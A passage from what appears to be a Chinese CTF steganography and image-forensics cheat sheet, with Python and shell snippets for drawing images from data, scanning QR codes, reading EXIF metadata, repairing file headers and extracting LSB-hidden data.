python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">61366</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line"><span class="keyword">if</span> (i*j)==a:</span><br><span class="line">print(i,j)</span><br><span class="line">(<span class="number">122</span>, <span class="number">503</span>)</span><br><span class="line">(<span class="number">503</span>, <span class="number">122</span>)</span><br></pre></td></tr></table></figure><p>然后脚本画图。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x=<span class="number">503</span></span><br><span class="line">y=<span class="number">122</span></span><br><span class="line"></span><br><span class="line">img=Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))</span><br><span class="line">file1=open(<span class="string">&#x27;./1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">        line=file1.readline().replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        print(line)</span><br><span class="line">        img.putpixel((i,j),(int(line[<span class="number">0</span>]),int(line[<span class="number">1</span>]),int(line[<span class="number">2</span>])))</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure><h3 id="01二维码"><a href="#01二维码" class="headerlink" title="01二维码"></a>01二维码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">25</span></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX,MAX))</span><br><span class="line">str=<span class="string">&quotquot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(str[i] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            img.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">img.show()</span><br><span class="line">img.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>使用kali工具扫描二维码拿到flag，如果二维码太小，可以放大截图，然后继续扫描。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ zbarimg &quot;&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;1.png&quot; &gt;&gt; 1.txt</span><br></pre></td></tr></table></figure><p><code>QR-Code:flag&#123;bin_2_qrcode&#125;</code></p><h3 id="分割图片批量扫描二维码"><a href="#分割图片批量扫描二维码" class="headerlink" title="分割图片批量扫描二维码"></a>分割图片批量扫描二维码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">id = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">25</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">25</span>):</span><br><span class="line">        box = (<span class="number">25</span> * i, <span class="number">25</span> * j, <span class="number">25</span> * (i + <span class="number">1</span>), <span class="number">25</span> * (j + <span class="number">1</span>))</span><br><span class="line">        im.crop(box).resize((<span class="number">500</span>, <span class="number">500</span>), Image.ANTIALIAS).save(<span class="string">&#x27;C:/Users/12521/Desktop/CTF脚本/图片二维码/分割二维码/1/%03d.png&#x27;</span> % id)</span><br><span class="line">        id += <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;<span class="number">0.</span><span class="number">.624</span>&#125;;do zbarimg <span class="string">&quot;./$i.png&quot;</span>;done &gt;&gt; qr.txt</span><br></pre></td></tr></table></figure><h3 id="上下左右画图"><a href="#上下左右画图" class="headerlink" title="上下左右画图"></a>上下左右画图</h3><p><code>R-right  L-left  U-up  D-down</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">s=<span class="string">&#x27;DDDDDDDDDRRRRRRDDDDDDDDDDDDDDDDLLLDDDDDDDDDDDLLRRRRLLDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRRUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDRRRRRRLDDDDDDDDDDDDDLLLLLLLRRRRRRRRLUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUUURRLLDDDDDDDDDDDDDDDDDDDDDDLLDDDDRRDDDDDDDDDDDDDDDDDDDDDDDRRLLUUUUUUUUUUUUUUUUUUUUUUULLUUUURRUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRDDDDDDDDDDDDDDDDDDDDDDRRRRRLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDRRRUUUUUUUUUUUUUUUURRRRLLLLDDDDDDDDDDDDDDDDRRRRDDDDDDDDDDDDDDDDDDDDDDLLLLRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRUUUUUUUUUUUUUUUUUUUUULLLRRRDDDDDDDDDDDDDDDDDDDDDDDDRRDDDDLLDDDDDDDDDDDDDDDDDDDDLLL&#x27;</span></span><br><span class="line">flag =np.zeros((<span class="number">199</span>,<span class="number">100</span>))</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line">y=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line"><span class="keyword">if</span>(s[i]==<span class="string">&#x27;D&#x27;</span>):</span><br><span class="line">y=y+<span class="number">1</span></span><br><span class="line">flag[x][y]=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">elif</span>(s[i]==<span class="string">&#x27;U&#x27;</span>):</span><br><span class="line">y=y<span class="number">-1</span></span><br><span class="line">flag[x][y]=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">elif</span>(s[i]==<span class="string">&#x27;R&#x27;</span>):</span><br><span class="line">x=x+<span class="number">1</span></span><br><span class="line">flag[x][y]=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">elif</span>(s[i]==<span class="string">&#x27;L&#x27;</span>):</span><br><span class="line">x=x<span class="number">-1</span></span><br><span class="line">flag[x][y]=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">f = open(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">199</span>):</span><br><span class="line"><span class="keyword">if</span>(str(flag[z][j])==<span class="string">&#x27;0.0&#x27;</span>):</span><br><span class="line">s+=<span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">s+=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">f.write(s)</span><br><span class="line">f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">1000</span>,<span class="number">1000</span>),<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"> <span class="comment">#把flag中的字母读出来</span></span><br><span class="line">line = <span class="string">&quot;DDDDDDDDDRRRRRRDDDDDDDDDDDDDDDDLLLDDDDDDDDDDDLLRRRRLLDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRRUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDRRRRRRLDDDDDDDDDDDDDLLLLLLLRRRRRRRRLUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUUURRLLDDDDDDDDDDDDDDDDDDDDDDLLDDDDRRDDDDDDDDDDDDDDDDDDDDDDDRRLLUUUUUUUUUUUUUUUUUUUUUUULLUUUURRUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRDDDDDDDDDDDDDDDDDDDDDDRRRRRLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDRRRUUUUUUUUUUUUUUUURRRRLLLLDDDDDDDDDDDDDDDDRRRRDDDDDDDDDDDDDDDDDDDDDDLLLLRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRUUUUUUUUUUUUUUUUUUUUULLLRRRDDDDDDDDDDDDDDDDDDDDDDDDRRDDDDLLDDDDDDDDDDDDDDDDDDDDLLL&quot;</span></span><br><span class="line">a = [<span class="number">300</span>,<span class="number">300</span>] <span class="comment">#起始位置</span></span><br><span class="line"><span class="comment">#把flag[0]当做左右移动 flag[1]当做上下移动</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> line:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">        a[<span class="number">1</span>] = a[<span class="number">1</span>]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;U&#x27;</span>:</span><br><span class="line">        a[<span class="number">1</span>] = a[<span class="number">1</span>]<span class="number">-1</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">        a[<span class="number">0</span>] = a[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">        a[<span class="number">0</span>] = a[<span class="number">0</span>]<span class="number">-1</span></span><br><span class="line">    im.putpixel(a ,(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>)) <span class="comment">## putpixel是通过坐标点来进行画图</span></span><br><span class="line"><span class="comment">##刚开始是按照惯例 让i == &#x27;u&#x27; +1 画出来是个倒立的图形 所以只能让 ‘D&#x27;+1</span></span><br><span class="line">print(a)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><h3 id="二坐标画图"><a href="#二坐标画图" class="headerlink" title="二坐标画图"></a>二坐标画图</h3><p>kali的<code>gnuplot</code>,主要该工具去需要去掉<code>（）</code>、以及逗号变成空格。</p><p>python脚本。</p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><h3 id="compare"><a href="#compare" class="headerlink" title="compare"></a>compare</h3><p>比较两张图片是否有异同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compare &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;1.png&#39;  &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;2.png&#39;  out.png</span><br></pre></td></tr></table></figure><p>查看得到的图片有什么异常。</p><h3 id="diif"><a href="#diif" class="headerlink" title="diif"></a>diif</h3><p>比较两张图片的不同，并显示十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -a a.jpg b.jpg|hexdump -C</span><br></pre></td></tr></table></figure><h3 id="wbs43open"><a href="#wbs43open" class="headerlink" title="wbs43open"></a>wbs43open</h3><p>bmp文件解密。</p><h3 id="hexdump"><a href="#hexdump" class="headerlink" title="hexdump"></a>hexdump</h3><p>查看文件十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C flag.png</span><br></pre></td></tr></table></figure><h3 id="webp"><a href="#webp" class="headerlink" title="webp"></a>webp</h3><ul><li><code>cwebp</code> - 编码器工具：可将 <code>png</code> 转为 <code>webp</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cwebp 1.png -o 2.webp</span><br></pre></td></tr></table></figure><ul><li><code>dwebp</code> - 解码器工具：可将 <code>webp</code> 转为 <code>png</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dwebp 1.webp -o 2.png</span><br></pre></td></tr></table></figure><ul><li><code>vwebp</code> - 查看器工具：可直接查看 <code>webp</code> 格式图片</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vwebp 1.webp</span><br></pre></td></tr></table></figure><ul><li><code>webpinfo</code> - 格式查看工具：可打印出 <code>WebP</code> 文件的块级结构以及基本完整性检查</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webpinfo 1.webp</span><br></pre></td></tr></table></figure><h3 id="exiftools"><a href="#exiftools" class="headerlink" title="exiftools"></a>exiftools</h3><h4 id="查看图片元数据"><a href="#查看图片元数据" class="headerlink" title="查看图片元数据"></a>查看图片元数据</h4><p>可以查看图片信息–数据可以包括诸如相机型号，闪光灯是否闪光，日期，时间甚至GPS坐标之类的信息。</p><p>比较重要的数据为<code>XP Comment</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool flag.jpg</span><br></pre></td></tr></table></figure><h4 id="批量提取元数据"><a href="#批量提取元数据" class="headerlink" title="批量提取元数据"></a>批量提取元数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool * | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">imgs = os.listdir(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">print(imgs)</span><br><span class="line">imgs = [img <span class="keyword">for</span> img <span class="keyword">in</span> imgs <span class="keyword">if</span> <span class="string">&#x27;.jpg&#x27;</span> <span class="keyword">in</span> img]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> img <span class="keyword">in</span> imgs:</span><br><span class="line">    exif_dict = dict()</span><br><span class="line"><span class="comment">#   img=re.sub(r&#x27;[(|)]&#x27;,&#x27;&#x27;,img)</span></span><br><span class="line">    exif = os.popen(<span class="string">&#x27;exiftool &#x27;</span> + <span class="string">&#x27;&quot;&#x27;</span> + img + <span class="string">&#x27;&quot;&#x27;</span>).read()</span><br><span class="line">    exif = exif.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> ex <span class="keyword">in</span> exif:</span><br><span class="line">        ex = ex.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> len(ex) == <span class="number">2</span>:</span><br><span class="line">            exif_dict[ex[<span class="number">0</span>].strip()] = ex[<span class="number">1</span>].split()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;XP Comment&#x27;</span> <span class="keyword">in</span> exif_dict:</span><br><span class="line">        print(exif_dict[<span class="string">&#x27;XP Comment&#x27;</span>])</span><br></pre></td></tr></table></figure><h4 id="提取缩略图"><a href="#提取缩略图" class="headerlink" title="提取缩略图"></a>提取缩略图</h4><p>XnView软件直接查看缩略图。</p><p>可以查看图片信息同时也可以缩略图提取，缩略图的最大特点就是两张图片都能在win和linux正常显示，但是在linux中图片会显示出别的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -b -ThumbnailImage delta.jpg &gt; flag.jpg</span><br></pre></td></tr></table></figure><h3 id="winhex与01editor"><a href="#winhex与01editor" class="headerlink" title="winhex与01editor"></a>winhex与01editor</h3><h4 id="正常情况"><a href="#正常情况" class="headerlink" title="正常情况"></a>正常情况</h4><p>丢入之后可以看到图片对应的ascii，其中可能藏有flag、base64等编码。</p><p>有时候需要修补文件头或者修补文件尾部。(通常是直接在头部或者尾部修补)</p><h4 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h4><p>特别情况下一个文件中可能会夹杂着其他的文件，可以使用binwalk分离。</p><p>有时候会藏有其他文件，但是其他文件的头部或者是尾部可能损坏或者缺失，binwalk分离不出来，需要我们手动找到需要</p><p>修改的部位，然后进行相应的修补。并且需要修改的地方不会是在头部或者尾部，而是大量文本的中间部分，这就是需要</p><p>我们先去搜索相应的敏感特殊字符或者十六进制。在搜索的时候，也可以尝试搜索某些文件的尾部，文件尾部结束之后就</p><p>会对应某些文件的头部，比如：</p><p>RAR的头部十六进制为：<code>526172211A</code>，对应的ascii为：<code>Rar!</code>。</p><p>PNG的头部十六进制为：<code>89504E470D0A1A0A0000000D</code>，对应的ascii为    <code>PNG</code>，有时候文件损坏，头部的数据并不会有</p><p>PNG，这时候我们可以搜索PNG特有的ascii—-<code>IHDR</code>,在PNG的尾部，也会特有<code>IEND</code>。尾部十六进制为：<code>49454E44AE426082</code>。</p><p>GIF的头部十六进制为：<code>4749463839</code>，对应的ascii为：<code>GIF89a</code>。</p><p>还有其他文件格式，就不一一列出。</p><h3 id="图片模糊处理"><a href="#图片模糊处理" class="headerlink" title="图片模糊处理"></a>图片模糊处理</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/26.png" alt="26"></p><h3 id="修改宽度和高度"><a href="#修改宽度和高度" class="headerlink" title="修改宽度和高度"></a>修改宽度和高度</h3><h4 id="JPG文件修改图片高度和宽度"><a href="#JPG文件修改图片高度和宽度" class="headerlink" title="JPG文件修改图片高度和宽度"></a>JPG文件修改图片高度和宽度</h4><p>搜索<code>FFC0</code>后的第四到七的字节就是图片的宽和高度。</p><h4 id="PNG文件修改图片高度宽度"><a href="#PNG文件修改图片高度宽度" class="headerlink" title="PNG文件修改图片高度宽度"></a>PNG文件修改图片高度宽度</h4><h5 id="正常修改"><a href="#正常修改" class="headerlink" title="正常修改"></a>正常修改</h5><p>右键查看图片属性，查到长度和宽度，然后转换十六进制，搜索，修改对应的宽度、高度，然后修改成对应的十六进制。</p><h5 id="CRC爆破修改"><a href="#CRC爆破修改" class="headerlink" title="CRC爆破修改"></a>CRC爆破修改</h5><p>根据CRC爆破出正常的高度和宽度，进而进行修改。</p><h3 id="图片锐化"><a href="#图片锐化" class="headerlink" title="图片锐化"></a>图片锐化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;ifs.bmp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">X = img.size[<span class="number">0</span>]</span><br><span class="line">Y = img.size[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> X,Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(X<span class="number">-2</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(Y<span class="number">-2</span>):</span><br><span class="line">    a = img.getpixel((i,j))[<span class="number">0</span>]+img.getpixel((i,j))[<span class="number">1</span>]+img.getpixel((i,j))[<span class="number">2</span>]</span><br><span class="line">    b = img.getpixel((i,j+<span class="number">1</span>))[<span class="number">0</span>]+img.getpixel((i,j+<span class="number">1</span>))[<span class="number">1</span>]+img.getpixel((i,j+<span class="number">1</span>))[<span class="number">2</span>]</span><br><span class="line">    c = img.getpixel((i,j+<span class="number">2</span>))[<span class="number">0</span>]+img.getpixel((i,j+<span class="number">2</span>))[<span class="number">1</span>]+img.getpixel((i,j+<span class="number">2</span>))[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> (a &gt; b <span class="keyword">and</span> c &gt; b) <span class="keyword">or</span> (a &lt; b <span class="keyword">and</span> c &lt; b):</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      img.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure><h3 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h3><h4 id="lsb-py"><a href="#lsb-py" class="headerlink" title="lsb.py"></a>lsb.py</h4><p>在debain8的虚拟机上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/cloacked-pixel-master<span class="comment"># python2 lsb.py extract 11.png 1.txt 123456</span></span><br><span class="line">[+] Image size: <span class="number">331</span>x300 pixels.</span><br><span class="line">[+] Written extracted data to <span class="number">1.</span>txt.</span><br></pre></td></tr></table></figure><h4 id="八位二进制最低有效位隐写"><a href="#八位二进制最低有效位隐写" class="headerlink" title="八位二进制最低有效位隐写"></a>八位二进制最低有效位隐写</h4><p>这里要注意图片的模式。如果为L就必须要注意。而且图片是png或者bmp,不能是jpg。</p><p>取每个坐标的像素，然后转换成二进制，然后与1异或得到的0或1就是隐藏的信息，将0或1转换得到flag，比如转换为二维码或者直接转成字符串。</p><h4 id="stegsolve"><a href="#stegsolve" class="headerlink" title="stegsolve"></a>stegsolve</h4><p>最常见的是两张图片进行xor，一定要注意xor的顺序，先打开某一个文件，然后两者在xor，顺序是有影响的。</p><p>每个通道的0位置，把每个0位置保存下来进行xor。</p><p>直接提取信息–<code>data extract</code>，这里配合zsteg。</p><h3 id="从图片中提取flag"><a href="#从图片中提取flag" class="headerlink" title="从图片中提取flag"></a>从图片中提取flag</h3><p>图片中隐约的有flag这时候我们需要使用脚本去根据rgb值提取flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;hide.png&#x27;</span>)</span><br><span class="line">w = img.width</span><br><span class="line">h = img.height</span><br><span class="line">img_obj = Image.new(<span class="string">&quot;RGB&quot;</span>,(w//<span class="number">16</span>,h//<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(w//<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(h//<span class="number">16</span>):</span><br><span class="line">        (r,g,b)=img.getpixel((x*<span class="number">16</span>,y*<span 